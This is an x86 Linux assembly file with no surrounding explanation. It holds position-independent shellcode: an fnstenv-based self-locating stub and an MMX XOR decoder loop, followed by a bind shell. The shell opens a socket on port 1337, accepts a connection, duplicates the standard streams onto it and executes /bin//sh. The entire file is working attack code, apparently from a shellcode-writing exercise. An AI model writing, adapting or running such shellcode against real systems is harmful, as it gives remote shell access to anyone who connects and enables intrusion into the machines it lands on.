section .text
global _start
_start:
	fcmovbe st6
	fnstenv [esp-0xc]
	pop edi
	xor ecx, ecx
	mov cl, 0xc
	jmp short setup
	db 0x8a
	db 0xea
	db 0x4c
	db 0xef
	db 0xd1
	db 0x3e
	db 0x91
	db 0xfc
setup:
	movq mm0, [edi+0xd]
	add edi, 0x2a
loop_back:
	movq mm1, qword [edi]
	pxor mm1, mm0
	movq qword [edi], mm1
	add edi, 0x8
	loop loop_back



	xor eax, eax		;31 c0
	push eax		;50
	push eax		;50
	push eax		;50
	push eax		;50
	push eax		;50
	push byte +0x66		; socketcall()
	pop eax
	push byte +0x1		; socketcall(socket)
	pop ebx
	xor esi,esi
	push esi
	push ebx
	push byte +0x2
	mov ecx,esp
	int 0x80
	pop edi
	xchg eax,edi		; socketcall(bind)
	xchg eax,ebx
	mov al,0x66		; socketcall()
	push esi
	push word 0x3905	; 1337 port
	push bx
	mov ecx,esp
	push byte +0x10
	push ecx
	push edi
	mov ecx,esp
	int 0x80
	mov al,0x66		; socketcall()
	mov bl,0x4		; socketcall(listen)
	push esi
	push edi
	mov ecx,esp
	int 0x80
	mov al,0x66		; socketcall()
	inc ebx			; socketcall(accept)
	push esi
	push esi
	push edi
	mov ecx,esp
	int 0x80
	pop ecx
	pop ecx
	mov cl,0x2
	xchg eax,ebx
dup2_loop:
	mov al,0x3f		; dup2(fd, ecx)
	int 0x80
	dec ecx
	jns dup2_loop
	mov al,0xb		; execve()
	push dword 0x68732f2f	; hs//
	push dword 0x6e69622f	; nib/
	mov ebx,esp
	inc ecx
	mov edx,ecx
	int 0x80

